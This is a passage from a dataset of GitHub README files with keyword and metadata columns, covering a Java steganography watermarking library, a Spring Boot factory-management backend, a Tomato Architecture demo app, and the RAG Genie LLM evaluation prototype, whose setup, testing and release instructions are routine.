// Output: This is the message
```

# About the author
Adumbra was developed while working on 
[Gallium Data](https://www.galliumdata.com)
to allow invisible watermarking of bitmaps stored in databases.
It is open source with an Apache 2.0 license.
",0,0,2,apache-2.0,0.0,"['adumbra', 'library', 'adumbra', 'java', 'library', 'us', 'steganography', 'hide', 'data', 'bitmap', 'using', 'secret', 'key', 'supported', 'input', 'format', 'include', 'png', 'jpeg', 'tiff', 'bmp', 'output', 'format', 'png', 'tiff', 'format', 'lossy', 'therefore', 'difficult', 'support', 'adumbra', 'requires', 'bitmap', 'pixel', 'every', 'byte', 'secret', 'message', 'bitmap', 'pixel', 'could', 'contain', 'secret', 'message', 'byte', 'maximum', 'size', 'secret', 'message', 'byte', 'adumbra', 'intended', 'used', 'way', 'mark', 'bitmap', 'way', 'rather', 'efficient', 'way', 'transmit', 'large', 'amount', 'secret', 'data', 'work', 'adumbra', 'hide', 'secret', 'message', 'bitmap', 'distributing', 'message', 'bit', 'least', 'significant', 'bit', 'pixel', 'using', 'one', 'color', 'per', 'pixel', 'r', 'g', 'b', 'pattern', 'determined', 'secret', 'key', 'encoded', 'bitmap', 'message', 'encrypted', 'using', 'secure', 'hash', 'secret', 'key', 'adumbra', 'also', 'randomize', 'least', 'significant', 'bit', 'pixel', 'make', 'difficult', 'determine', 'whether', 'bitmap', 'contains', 'secret', 'message', 'long', 'message', 'may', 'option', 'even', 'someone', 'access', 'original', 'bitmap', 'still', 'would', 'able', 'decode', 'secret', 'message', 'without', 'secret', 'key', 'could', 'determine', 'changed', 'bit', 'belongs', 'secret', 'message', 'noise', 'secure', 'library', 'reviewed', 'cryptography', 'expert', 'exercise', 'common', 'sense', 'rely', 'hide', 'national', 'security', 'secret', 'always', 'encryption', 'length', 'secret', 'key', 'important', 'using', 'short', 'key', 'less', 'secure', 'longer', 'key', 'randomness', 'key', 'also', 'factor', 'general', 'using', 'secret', 'key', 'least', 'random', 'character', 'give', 'excellent', 'secrecy', 'want', 'mark', 'bitmap', 'way', 'without', 'worrying', 'adversary', 'random', 'character', 'plenty', 'two', 'main', 'obstacle', 'decoding', 'secret', 'message', 'determining', 'bitmap', 'contains', 'message', 'attacker', 'analyzes', 'modified', 'bitmap', 'may', 'able', 'determine', 'bitmap', 'contains', 'suspicious', 'noise', 'would', 'difficult', 'certain', 'unless', 'access', 'original', 'bitmap', 'decoding', 'secret', 'message', 'even', 'original', 'bitmap', 'without', 'secret', 'key', 'attacker', 'would', 'difficult', 'time', 'figure', 'bit', 'actually', 'belong', 'secret', 'message', 'even', 'would', 'decrypt', 'message', 'encoded', 'using', 'hash', 'secret', 'key', 'removing', 'secret', 'message', 'keep', 'mind', 'fairly', 'easy', 'scramble', 'secret', 'message', 'hidden', 'bitmap', 'save', 'bitmap', 'bit', 'compression', 'case', 'make', 'secret', 'message', 'unrecognizable', 'command', 'line', 'usage', 'encoding', 'message', 'bitmap', 'bitmap', 'file', 'supported', 'input', 'format', 'supported', 'java', 'platform', 'usually', 'include', 'file', 'write', 'bitmap', 'hidden', 'message', 'message', 'encoded', 'bitmap', 'secret', 'key', 'used', 'hide', 'message', 'optional', 'format', 'output', 'file', 'specified', 'format', 'input', 'file', 'used', 'png', 'tiff', 'allowed', 'format', 'lossy', 'optional', 'integer', 'zero', 'mean', 'minimum', 'security', 'noise', 'added', 'image', 'mean', 'depending', 'bitmap', 'may', 'easy', 'detect', 'image', 'contains', 'secret', 'data', 'long', 'data', 'one', 'add', 'noise', 'repetition', 'making', 'much', 'difficult', 'determine', 'bitmap', 'contains', 'secret', 'data', 'two', 'add', 'fully', 'random', 'noise', 'even', 'secure', 'somewhat', 'slower', 'example', 'encode', 'message', 'bitmap', 'file', 'extract', 'secret', 'message', 'bitmap', 'file', 'output', 'library', 'usage', 'library', 'dependency', 'javadoc', 'maven', 'encoding', 'java', 'decoding', 'java', 'author', 'adumbra', 'developed', 'working', 'gallium', 'data', 'allow', 'invisible', 'watermarking', 'bitmap', 'stored', 'database', 'open', 'source', 'apache', 'license']","['secret', 'bitmap', 'message', 'key', 'adumbra']",1,0,0,"['the', 'adumbra', 'library', 'how', 'work', 'how', 'secure', 'this', 'determine', 'bitmap', 'contains', 'message', 'decode', 'secret', 'message', 'remove', 'secret', 'message', 'command', 'line', 'usage', 'encode', 'message', 'bitmap', 'example', 'extract', 'secret', 'message', 'bitmap', 'file', 'library', 'usage', 'maven', 'encode', 'java', 'decode', 'java', 'about', 'author']",15,"['message', 'bitmap', 'secret', 'library', 'how']",7,0.0,1.0,"[org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-project-info-reports-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0,5744,28.96875,4.702265372168285,"['steganography -> https://en.wikipedia.org/wiki/Steganography', 'Javadoc is here -> https://javadoc.io/doc/com.galliumdata.adumbra/adumbra/latest/com/galliumdata/adumbra/package-summary.html', 'Gallium Data -> https://www.galliumdata.com']",3
Gayanukaa/companyA-backend,main,"# Company A Backend

## Backend for Subsystems of Company A

This is project hosts the backend of a business process management of a factory which manufactures and assembles electronic equipment. The application allows users to manage the company under 10 different subsystems.

<ol>
  <li><a href ='https://github.com/Gayanukaa/companyA-backend/tree/main/backend/src/main/java/com/companyA/backend/InventoryManagementSystem'>Supplies,Stocks,Inventory Management System</a></li>
  <li><a href ='https://github.com/Gayanukaa/companyA-backend/tree/main/backend/src/main/java/com/companyA/backend/GeneralManagementSystem'>General Management System</a></li>
  <li><a href ='https://github.com/Gayanukaa/companyA-backend/tree/main/backend/src/main/java/com/companyA/backend/CustomerOrderSystem'>Customer Order Management System</a></li>
  <li><a href ='https://github.com/Gayanukaa/companyA-backend/tree/main/backend/src/main/java/com/companyA/backend/FinanceSystem'>Finance, Payroll and Risk Assessment System</a></li>
  <li><a href ='https://github.com/Gayanukaa/companyA-backend/tree/main/backend/src/main/java/com/companyA/backend/HumanResourceSystem'>Human Resource Management System</a></li>
  <li><a href ='https://github.com/Gayanukaa/companyA-backend/tree/main/backend/src/main/java/com/companyA/backend/LogisticsAndMaintenanceSystem'>Logistics, Vehicles, Machinery, Services and Maintenance System</a></li>
  <li><a href ='https://github.com/Gayanukaa/companyA-backend/tree/main/backend/src/main/java/com/companyA/backend/ManufacturingSystem'>Manufacturing and Assembly Line Planning and Management System</a></li>
  <li><a href ='https://github.com/Gayanukaa/companyA-backend/tree/main/backend/src/main/java/com/companyA/backend/QualityAssuaranceSystem'>Quality Assurance and Quality Control System</a></li>
  <li><a href ='https://github.com/Gayanukaa/companyA-backend/tree/main/backend/src/main/java/com/companyA/backend/SalesSystem'>Sales and Marketing System</a></li>
  <li><a href ='https://github.com/Gayanukaa/companyA-backend/tree/main/backend/src/main/java/com/companyA/backend/TrainingAndDevelopmentSystem'>Training (Skills Development), Prototyping, Product/Process Development and Simulation System</a></li>
</ol>

The backend is built using Spring Boot and MongoDB database to create a full-stack web application. It is deployed on a NGINX server using Azure App Service.

## Overview

[![Build and deploy JAR app to Azure Web App - spring-boot-companyA](https://github.com/Gayanukaa/companyA-backend/actions/workflows/dev_spring-boot-companya.yml/badge.svg?branch=dev)](https://github.com/Gayanukaa/companyA-backend/actions/workflows/dev_spring-boot-companya.yml)
<p>
 <img src=""https://img.shields.io/github/last-commit/Gayanukaa/companyA-backend?style=flat&logo=git&logoColor=white&color=0080ff"" alt=""last-commit"">
 <img src=""https://img.shields.io/github/languages/top/Gayanukaa/companyA-backend?style=flat&color=0080ff"" alt=""repo-top-language"">
 <img src=""https://img.shields.io/github/languages/count/Gayanukaa/companyA-backend?style=flat&color=0080ff"" alt=""repo-language-count"">
<p>
<p>
  <em>Developed with the software and tools below.</em>
</p>
<p>
 <img src=""https://img.shields.io/badge/java-%23ED8B00.svg?style=flat&logo=openjdk&logoColor=white"" alt=""java"">
 <img src=""https://img.shields.io/badge/Spring-6DB33F.svg?style=flat&logo=Spring&logoColor=white"" alt=""Spring"">
 <img src=""https://img.shields.io/badge/MongoDB-47A248.svg?style=flat&logo=MongoDB&logoColor=white"" alt=""MongoDB"">
 <img src=""https://img.shields.io/badge/JSON-000000.svg?style=flat&logo=JSON&logoColor=white"" alt=""JSON"">
 <img src=""https://img.shields.io/badge/nginx-%23009639.svg?logo=nginx&logoColor=white"" ALT=""NGINX"">
 <img src=""https://img.shields.io/badge/azure-%230072C6.svg?logo=azure-devops&logoColor=white"" ALT=""Azure"">
  <img src=""https://img.shields.io/badge/Postman-FF6C37?logo=postman&logoColor=white"" ALT=""Postman"">
  <img src=""https://img.shields.io/badge/Insomnia-black?logo=insomnia&logoColor=white&color=330066"" ALT=""Insomnia"">
  <img src=""https://img.shields.io/badge/git-F05032?logo=git&logoColor=FFFFFF"" ALT=""Git"">
  <img src=""https://img.shields.io/badge/github-181717?logo=github&logoColor=FFFFFF"" ALT=""GitHub"">

## Installation

1. Clone the repository: `git clone https://github.com/your-username/companyA-backend.git`
2. Navigate to the project directory: `cd backend`
3. Install dependencies: `mvn install`
4. Configure the database connection in `application.properties`.
5. Run the application: `mvn spring-boot:run`

## Prerequisites

Before running this application, make sure you have the following tools installed:

- [Java Development Kit (JDK) 17](https://www.oracle.com/java/technologies/downloads/#java17)

## Usage

- Open your web browser and navigate to `https://spring-boot-companya.azurewebsites.net/`

## Contributors

<a href=""https://github.com/Gayanukaa/companyA-backend/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=Gayanukaa/companyA-backend"" />
</a>

## License

This project is licensed under the [Apache License 2.0](https://choosealicense.com/licenses/apache-2.0/)

## Contact

If you have any questions or suggestions, please feel free to reach out to us at [gayanukaamarasuriya@gmail.com](mailto:gayanukaamarasuriya@gmail.com).

",1,0,12,apache-2.0,22.0,"['company', 'backend', 'backend', 'subsystem', 'company', 'project', 'host', 'backend', 'business', 'process', 'management', 'factory', 'manufacture', 'assembles', 'electronic', 'equipment', 'application', 'allows', 'user', 'manage', 'company', 'different', 'subsystem', 'backend', 'built', 'using', 'spring', 'boot', 'mongodb', 'database', 'create', 'web', 'application', 'deployed', 'nginx', 'server', 'using', 'azure', 'app', 'service', 'overview', 'installation', 'clone', 'repository', 'navigate', 'project', 'directory', 'install', 'dependency', 'configure', 'database', 'connection', 'run', 'application', 'prerequisite', 'running', 'application', 'make', 'sure', 'following', 'tool', 'installed', 'java', 'development', 'kit', 'jdk', 'usage', 'open', 'web', 'browser', 'navigate', 'contributor', 'license', 'project', 'licensed', 'apache', 'license', 'contact', 'question', 'suggestion', 'please', 'feel', 'free', 'reach', 'u', 'gayanukaamarasuriya']","['backend', 'application', 'company', 'project', 'subsystem']",0,0,0,"['company', 'a', 'backend', 'backend', 'subsystem', 'company', 'a', 'overview', 'installation', 'prerequisite', 'usage', 'contributor', 'license', 'contact']",9,"['company', 'a', 'backend', 'subsystem', 'overview']",0,0.0,1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0,5307,64.25,5.341115434500648,"['![Build and deploy JAR app to Azure Web App - spring-boot-companyA -> https://github.com/Gayanukaa/companyA-backend/actions/workflows/dev_spring-boot-companya.yml/badge.svg?branch=dev', 'Java Development Kit (JDK) 17 -> https://www.oracle.com/java/technologies/downloads/#java17', 'Apache License 2.0 -> https://choosealicense.com/licenses/apache-2.0/']",3
sivaprasadreddy/tomato-architecture-spring-boot-demo,main,"# tomato-architecture-spring-boot-demo
A sample Spring Boot application following [Tomato Architecture](https://github.com/sivaprasadreddy/tomato-architecture)

## Prerequisites
* JDK 21
* Docker Compose

## TechStack
* Java 21
* Spring Boot
* Spring Modulith
* jOOQ
* PostgreSQL
* Kafka
* Testcontainers
* Docker Compose

## How to run?
The application is configured to use Docker Compose to start the dependent services (Postgres, Kafka).
You can simply run `BookStoreApplication.java` from your IDE to start the application.

**NOTE:** To work with Kafka transparently from both local and container, add `127.0.0.1   broker` entry in `/etc/hosts` file.

To know more about Spring Boot Docker Compose Support, you can watch the following video.

[![Spring Boot Docker Compose Support](https://img.youtube.com/vi/PZt5EJTLH4o/0.jpg)](https://www.youtube.com/watch?v=PZt5EJTLH4o)

You can also start the application from commandline as follows:

```shell
$ ./mvnw spring-boot:run
```

## Run tests
You can run the tests as follows:

```shell
$ ./mvnw test
```

The application is using Spring Modulith to verify the module boundaries.
To know more about Spring Modulith, you can watch the following video.

[![Spring Modulith Crash Course : Building Modular Monoliths using Spring Boot](https://img.youtube.com/vi/FkP2aZiBrhg/0.jpg)](https://www.youtube.com/watch?v=FkP2aZiBrhg)

",0,1,1,apache-2.0,0.0,"['sample', 'spring', 'boot', 'application', 'following', 'tomato', 'architecture', 'prerequisite', 'jdk', 'docker', 'compose', 'techstack', 'java', 'spring', 'boot', 'spring', 'modulith', 'jooq', 'postgresql', 'kafka', 'testcontainers', 'docker', 'compose', 'run', 'application', 'configured', 'use', 'docker', 'compose', 'start', 'dependent', 'service', 'postgres', 'kafka', 'simply', 'run', 'ide', 'start', 'application', 'note', 'work', 'kafka', 'transparently', 'local', 'container', 'add', 'entry', 'file', 'know', 'spring', 'boot', 'docker', 'compose', 'support', 'watch', 'following', 'video', 'also', 'start', 'application', 'commandline', 'follows', 'run', 'test', 'run', 'test', 'follows', 'application', 'using', 'spring', 'modulith', 'verify', 'module', 'boundary', 'know', 'spring', 'modulith', 'watch', 'following', 'video']","['spring', 'application', 'docker', 'compose', 'run']",0,1,0,"['prerequisite', 'techstack', 'how', 'run', 'run', 'test']",5,"['run', 'prerequisite', 'techstack', 'how', 'test']",2,3.0,1.0,"[com.diffplug.spotless:spotless-maven-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.springframework.boot:spring-boot-maven-plugin,org.testcontainers:testcontainers-jooq-codegen-maven-plugin]",0.0,1.0,0.0,1379,20.0,5.26,"['Tomato Architecture -> https://github.com/sivaprasadreddy/tomato-architecture', '![Spring Boot Docker Compose Support -> https://img.youtube.com/vi/PZt5EJTLH4o/0.jpg', '![Spring Modulith Crash Course : Building Modular Monoliths using Spring Boot -> https://img.youtube.com/vi/FkP2aZiBrhg/0.jpg']",3
stephanj/rag-genie,master,"# RAG Genie

## About

The RAG Genie, an LLM RAG prototype to test and evaluate your embeddings, chunk splitting strategies using Q&A and evaluations. 

https://github.com/stephanj/rag-genie/assets/179457/e154a2ba-b031-4c62-adb4-fc87c7d448da

## Contribute

To contribute to this project, please read the [contribution guidelines](CONTRIBUTING.md).
Also make sure to read the [translation guidelines](TRANSLATION.md) if you want to contribute to the translations.

## Useful links

* [ChangeLog](CHANGELOG.md)
* [Github project](https://github.com/stephanj/rag-genie/)

## Configure your development environment

### Install Taskfile.dev

Taskfile is a task runner / build tool that aims to be simpler and easier to use than, for example, GNU Make.

If you're on macOS or Linux and have [Homebrew](https://brew.sh/) installed, just run:

    brew install go-task

Otherwise, you can follow the [installation instructions](https://taskfile.dev/installation/) for your platform.

You can list all available tasks with:

    > task

    task: Available tasks for this project:

    * clean:                                🧽 Clean generated code and binaries
    * default:                              📝 List all tasks
    * genie:backend:start:                  🏃 Start Genie Spring Boot backend
    * genie:backend:start:prod:             🏃 Start Genie Spring Boot backend in production mode
    * genie:build:                          🏗️ Build the app (tests are skipped) (aliases: build)
    * genie:build:prod:                     🏗 Build the app (tests are skipped) in production mode
    * genie:frontend:build:                 🏗️ Build Genie Node/Angular frontend
    * genie:frontend:start:                 🏃 Start Genie Node/Angular frontend
    * genie:frontend:sync:                  👀 Build Genie Node/Angular frontend in watch mode
    * genie:release:                        📦 Release a new Genie version (automatically selected)                      (aliases: release)
    * genie:release:alpha:                  📦 Release a new Genie pre-release alpha version                             (aliases: release:alpha)
    * genie:release:beta:                   📦 Release a new Genie pre-release beta version                              (aliases: release:beta)
    * genie:release:major:                  📦 Release a new Genie major version                                         (aliases: release:major)
    * genie:release:minor:                  📦 Release a new Genie minor version                                         (aliases: release:minor)
    * genie:release:patch:                  📦 Release a new Genie patch version                                         (aliases: release:patch)
    * genie:start:                          🏃 Start Genie                                                               (aliases: start)
    * genie:start:prod:                     🏃 Start Genie locally in production mode (triggers a full clean build)      (aliases: start:prod)
    * genie:test:                           ✅ Test the app                                                              (aliases: test)
    * clean:full:                           🧽 Clean generated code, binaries including Node and its modules
    * db:drop:                              🧽 Stop and remove all services data (PostgreSQL)
    * db:dump:                              ⬇️ Dump data from local PostgreSQL instance
    * db:import:                            ⬆️ Import data into local PostgreSQL instance
    * db:liquibase:clear-checksums:         🧽 Clear Liquibase checksums
    * db:liquibase:update:                  ⚙️ Update local database with Liquibase changes
    * db:liquibase:validate:                ☑️ Validate local database with Liquibase changes
    * db:restart:                           🔄 Restart PostgreSQL db
    * db:start:                             🏃 Start PostgreSQL db
    * db:status:                            🚦 PostgreSQL db status
    * db:stop:                              🛑 Stop PostgreSQL db
    * env:setup:                            🛠️ Setup the project environment
    * env:verify:                           ☑️ Verify the project environment setup

If you want to see the commands executed by a task, you can use the `--dry-run` option:

    task --dry genie:build

### Verify your environment

To verify your environment is compatible with the project, run the following command:

    task env:verify

### Setup your environment

You can manually setup your environment by following feedback from the `env:verify` task 
or you can run the following command to let us doing the setup:

    task env:setup

The script will install all required tools and dependencies and supports the following package managers:

* [ASDF](https://asdf-vm.com/) - preferred when available as it supports a large set of tools and versions
* [SDKMAN](https://sdkman.io/) - used when ASDF is not available to setup Java
* [Homebrew](https://brew.sh/) - used when others are not available. It will change the default version of the required tools on your system which is why ASDF or SDKMAN are preferred.

## Build and execute automated tests

The project uses [Apache Maven](https://maven.apache.org/) as build tool and [JUnit 5](https://junit.org/junit5/) as test framework.

To build the project without running the tests, run the following command:

    task build

The application is packaged as a [Spring Boot](https://spring.io/projects/spring-boot) executable jar file.
You can find the jar file in the `target` directory, it is compiled in `dev` mode.

To build it in production mode, run the following command:

    task genie:build:prod

To build the project and execute the tests, run the following command:

    task test

## Run Locally

### Environment variables

First create a `.env` file in the root of the project by copying the sample file as follows:

    copy .env.example .env

Update the content of `.env` with the correct values provided by a project administrator.

You can also use `.env` to override the default values from `.env.default`.

You can pass to the application any configuration parameter as described in [Spring Boot documentation](https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.external-config). 

One mandatory env variable is GENIE_SECURITY_KEY_SECRET which is used to encrypt the API keys into the database.

The length of this key should be 32 characters (for 256-bit key) to work correctly with the AES encryption algorithm.

The following command will create a 32 characters keys

```
openssl rand -base64 32
``` 

### Start Genie

To start the application, run the following command:

    task start

The application is available at [http://localhost:8080](http://localhost:8080).

Launch in dev mode with hot reload enabled.
Any change in the code will be automatically reloaded.
Frontend code is automatically compiled using [Webpack](https://webpack.js.org/) and **[LiveReload](https://chromewebstore.google.com/detail/livereload/jnihajbhpnppcggbcgedagnkighmdlei?hl=fr) is used to reload the page when any change is detected (just install the browser extension and enable it on the website).**
We also advise installing the [Angular DevTools](https://chromewebstore.google.com/detail/angular-devtools/ienfalfjdbdpebioblfackkekamfmbnh) extension to debug the Angular application.

### Production mode

To build and launch the application in production mode, run the following command:

    task start:prod

### Manage the local database manually

You can start it with:

    task db:start

Restart it with:

    task db:restart

Stop it with:

    task db:stop

Check its status with:

    task db:status

Drop its content with:

    task db:drop

Dump its content with:

    task db:dump

### Liquibase Usage

Liquibase is used to manage the database schema.

You can update the database schema with the following command:

    task db:liquibase:update

You can also validate the database schema with the following command:

    task db:liquibase:validate

You can clear the checksums so liquibase can update from a fresh start with the following command:

    task db:liquibase:clear-checksums

By default, liquibase-maven-plugin is configured to target the local DB defined as

    <liquibase.url>jdbc:postgresql://localhost:5432/postgres</liquibase.url>
    <liquibase.username>postgres</liquibase.username>
    <liquibase.password>mysecretpassword</liquibase.password>

#### Liquibase table updates

Make sure to use changesets to add new columns or indexes

for example

     <changeSet id=""20231019-1171"" author=""stephan"">

        <addColumn tableName=""genie_content"">
            <column name=""enable_tags"" type=""boolean"" defaultValue=""false"">
                <constraints nullable=""true"" />
            </column>
        </addColumn>
    </changeSet>

### Frontend environment

To build individual the frontend (in production mode), run the following command:

    task genie:frontend:build

And you can launch the frontend in dev mode with:

    task genie:frontend:start

Then you need to start the backend with the following command:

    task genie:backend:start

Use `npm` and `npx` wrappers to manually run any command like `./npm run start` or `./npx webpack`.

## Release a new version

To release a new version, run the following command:

    task release

The release automation:

* updates the version in the `pom.xml` file,
* updates the version in the `package.json`/`package-lock.json` file,
* updates the CHANGELOG.md file,
* commits the changes,
* tags the commit,
* proposes to push the commit and the tag to the remote repository.

`task release` is selecting the next version (`X.Y.Z`) based on changes since the last release.

It is following the [Conventional Commits](https://www.conventionalcommits.org/en/v1.0.0/) convention.

If there is a commit with a breaking change it will increase to the next major version (X) :

> **BREAKING CHANGE:** a commit that has a footer `BREAKING CHANGE:`, or appends a `!` after the type/scope, introduces a breaking API change (correlating with [**`MAJOR`**](http://semver.org/#summary) in Semantic Versioning). A BREAKING CHANGE can be part of commits of any _type_.

else if a commit contains a feature it will increase to the next feature version (Y):

> **feat:** a commit of the _type_ `feat` introduces a new feature to the codebase (this correlates with [**`MINOR`**](http://semver.org/#summary) in Semantic Versioning).

otherwise it will increase to the next patch version (Y):

> **fix:** a commit of the _type_ `fix` patches a bug in your codebase (this correlates with [**`PATCH`**](http://semver.org/#summary) in Semantic Versioning).
>
> types other than fix: and feat: are allowed, for example @commitlint/config-conventional (based on the Angular convention) recommends build:, chore:, ci:, docs:, style:, refactor:, perf:, test:, and others.

**Rollback a release:** After release you are asked to confirm to push the release commit and tag to gitlab. You can always refuse it and cancel the release by removing the release commit (`git reset --hard HEAD~1`) and the tag (`git tag --delete vX.Y.Z`)

You can also manually select the version to release with the following command:

    task release:patch # To force the creation of a patch version
    task release:minor # To force the creation of a minor version
    task release:major # To force the creation of a major version

    task release:alpha # To force the creation of a pre-release alpha version (X.Y.Z-alpha.N)
    task release:beta # To force the creation of a pre-release beta version (X.Y.Z-beta.N)

## Conventional Commits

We are using [Conventional Commits](https://www.conventionalcommits.org/en/v1.0.0/) for commit messages.

The commit message should be structured as follows:

    <type>[optional scope]: <description>

    [optional body]

    [optional footer(s)]

Common types are:

* **Feature (`feat`)**: A commit of this type introduces a new feature to the codebase. This correlates with a [**`MINOR`**](http://semver.org/#summary) version in Semantic Versioning.
* **Fix (`fix`)**: A commit of this type patches a bug in your codebase. This correlates with a [**`PATCH`**](http://semver.org/#summary) version in Semantic Versioning.
* **Documentation (`docs`)**: A commit of this type only affects documentation.
* **Refactor (`refactor`)**: A commit of this type involves code refactoring, which neither fixes a bug nor adds a feature.
* **Style (`style`)**: A commit of this type pertains to formatting, white-space, or other changes that do not affect the meaning of the code.
* **Chore (`chore`)**: A commit of this type includes changes that do not relate to a fix or feature and do not modify source or test files. For example, updating dependencies.
* **Performance (`perf`)**: A commit of this type enhances performance.
* **Test (`test`)**: A commit of this type either adds missing tests or corrects existing tests.
* **Build (`build`)**: A commit of this type affects the build system or external dependencies. Example scopes include gulp, broccoli, npm.
* **Continuous Integration (`ci`)**: A commit of this type affects the continuous integration system configuration.
* **Revert (`revert`)**: A commit of this type reverts a previous commit.

**BREAKING CHANGE**: a commit that has a footer `BREAKING CHANGE:`, or appends a `!` after the type/scope, introduces a breaking API change (correlating with [**`MAJOR`**](http://semver.org/#summary) in Semantic Versioning). A BREAKING CHANGE can be part of commits of any _type_.

Optional scopes can be anything specifying the place of the commit change. For example, it can be the reference of a ticket like `#1234`.

Example:

    feat(#1234): allow provided config object to extend other configs

    BREAKING CHANGE: `extends` key in config file is now used for extending other config files

    closes #1234
",0,1,3,mit,7.0,"['rag', 'genie', 'rag', 'genie', 'llm', 'rag', 'prototype', 'test', 'evaluate', 'embeddings', 'chunk', 'splitting', 'strategy', 'using', 'q', 'evaluation', 'http', 'contribute', 'contribute', 'project', 'please', 'read', 'contribution', 'guideline', 'also', 'make', 'sure', 'read', 'translation', 'guideline', 'want', 'contribute', 'translation', 'useful', 'link', 'changelog', 'github', 'project', 'configure', 'development', 'environment', 'install', 'taskfile', 'task', 'runner', 'build', 'tool', 'aim', 'simpler', 'easier', 'use', 'example', 'gnu', 'make', 'macos', 'linux', 'homebrew', 'installed', 'run', 'otherwise', 'follow', 'installation', 'instruction', 'platform', 'list', 'available', 'task', 'want', 'see', 'command', 'executed', 'task', 'use', 'option', 'verify', 'environment', 'verify', 'environment', 'compatible', 'project', 'run', 'following', 'command', 'setup', 'environment', 'manually', 'setup', 'environment', 'following', 'feedback', 'task', 'run', 'following', 'command', 'let', 'u', 'setup', 'script', 'install', 'required', 'tool', 'dependency', 'support', 'following', 'package', 'manager', 'asdf', 'preferred', 'available', 'support', 'large', 'set', 'tool', 'version', 'sdkman', 'used', 'asdf', 'available', 'setup', 'java', 'homebrew', 'used', 'others', 'available', 'change', 'default', 'version', 'required', 'tool', 'system', 'asdf', 'sdkman', 'preferred', 'build', 'execute', 'automated', 'test', 'project', 'us', 'apache', 'maven', 'build', 'tool', 'junit', 'test', 'framework', 'build', 'project', 'without', 'running', 'test', 'run', 'following', 'command', 'application', 'packaged', 'spring', 'boot', 'executable', 'jar', 'file', 'find', 'jar', 'file', 'directory', 'compiled', 'mode', 'build', 'production', 'mode', 'run', 'following', 'command', 'build', 'project', 'execute', 'test', 'run', 'following', 'command', 'run', 'locally', 'environment', 'variable', 'first', 'create', 'file', 'root', 'project', 'copying', 'sample', 'file', 'follows', 'update', 'content', 'correct', 'value', 'provided', 'project', 'administrator', 'also', 'use', 'override', 'default', 'value', 'pas', 'application', 'configuration', 'parameter', 'described', 'spring', 'boot', 'documentation', 'one', 'mandatory', 'env', 'variable', 'used', 'encrypt', 'api', 'key', 'database', 'length', 'key', 'character', 'key', 'work', 'correctly', 'aes', 'encryption', 'algorithm', 'following', 'command', 'create', 'character', 'key', 'start', 'genie', 'start', 'application', 'run', 'following', 'command', 'application', 'available', 'http', 'launch', 'dev', 'mode', 'hot', 'reload', 'enabled', 'change', 'code', 'automatically', 'reloaded', 'frontend', 'code', 'automatically', 'compiled', 'using', 'webpack', 'livereload', 'used', 'reload', 'page', 'change', 'detected', 'install', 'browser', 'extension', 'enable', 'website', 'also', 'advise', 'installing', 'angular', 'devtools', 'extension', 'debug', 'angular', 'application', 'production', 'mode', 'build', 'launch', 'application', 'production', 'mode', 'run', 'following', 'command', 'manage', 'local', 'database', 'manually', 'start', 'restart', 'stop', 'check', 'status', 'drop', 'content', 'dump', 'content', 'liquibase', 'usage', 'liquibase', 'used', 'manage', 'database', 'schema', 'update', 'database', 'schema', 'following', 'command', 'also', 'validate', 'database', 'schema', 'following', 'command', 'clear', 'checksum', 'liquibase', 'update', 'fresh', 'start', 'following', 'command', 'default', 'configured', 'target', 'local', 'db', 'defined', 'liquibase', 'table', 'update', 'make', 'sure', 'use', 'changesets', 'add', 'new', 'column', 'index', 'example', 'frontend', 'environment', 'build', 'individual', 'frontend', 'production', 'mode', 'run', 'following', 'command', 'launch', 'frontend', 'dev', 'mode', 'need', 'start', 'backend', 'following', 'command', 'use', 'wrapper', 'manually', 'run', 'command', 'like', 'release', 'new', 'version', 'release', 'new', 'version', 'run', 'following', 'command', 'release', 'automation', 'update', 'version', 'file', 'update', 'version', 'file', 'update', 'file', 'commits', 'change', 'tag', 'commit', 'proposes', 'push', 'commit', 'tag', 'remote', 'repository', 'selecting', 'next', 'version', 'based', 'change', 'since', 'last', 'release', 'following', 'conventional', 'commits', 'convention', 'commit', 'breaking', 'change', 'increase', 'next', 'major', 'version', 'x', 'breaking', 'change', 'commit', 'footer', 'appends', 'introduces', 'breaking', 'api', 'change', 'correlating', 'semantic', 'versioning', 'breaking', 'change', 'part', 'commits', 'type', 'else', 'commit', 'contains', 'feature', 'increase', 'next', 'feature', 'version', 'feat', 'commit', 'type', 'introduces', 'new', 'feature', 'codebase', 'correlate', 'semantic', 'versioning', 'otherwise', 'increase', 'next', 'patch', 'version', 'fix', 'commit', 'type', 'patch', 'bug', 'codebase', 'correlate', 'semantic', 'versioning', 'type', 'fix', 'feat', 'allowed', 'example', 'based', 'angular', 'convention', 'recommends', 'build', 'chore', 'ci', 'doc', 'style', 'refactor', 'perf', 'test', 'others', 'rollback', 'release', 'release', 'asked', 'confirm', 'push', 'release', 'commit', 'tag', 'gitlab', 'always', 'refuse', 'cancel', 'release', 'removing', 'release', 'commit', 'tag', 'also', 'manually', 'select', 'version', 'release', 'following', 'command', 'conventional', 'commits', 'using', 'conventional', 'commits', 'commit', 'message', 'commit', 'message', 'structured', 'follows', 'common', 'type', 'feature', 'commit', 'type', 'introduces', 'new', 'feature', 'codebase', 'correlate', 'version', 'semantic', 'versioning', 'fix', 'commit', 'type', 'patch', 'bug', 'codebase', 'correlate', 'version', 'semantic', 'versioning', 'documentation', 'commit', 'type', 'affect', 'documentation', 'refactor', 'commit', 'type', 'involves', 'code', 'refactoring', 'neither', 'fix', 'bug', 'add', 'feature', 'style', 'commit', 'type', 'pertains', 'formatting', 'change', 'affect', 'meaning', 'code', 'chore', 'commit', 'type', 'includes', 'change', 'relate', 'fix', 'feature', 'modify', 'source', 'test', 'file', 'example', 'updating', 'dependency', 'performance', 'commit', 'type', 'enhances', 'performance', 'test', 'commit', 'type', 'either', 'add', 'missing', 'test', 'corrects', 'existing', 'test', 'build', 'commit', 'type', 'affect', 'build', 'system', 'external', 'dependency', 'example', 'scope', 'include', 'gulp', 'broccoli', 'npm', 'continuous', 'integration', 'commit', 'type', 'affect', 'continuous', 'integration', 'system', 'configuration', 'revert', 'commit', 'type', 'reverts', 'previous', 'commit', 'breaking', 'change', 'commit', 'footer', 'appends', 'introduces', 'breaking', 'api', 'change', 'correlating', 'semantic', 'versioning', 'breaking', 'change', 'part', 'commits', 'type', 'optional', 'scope', 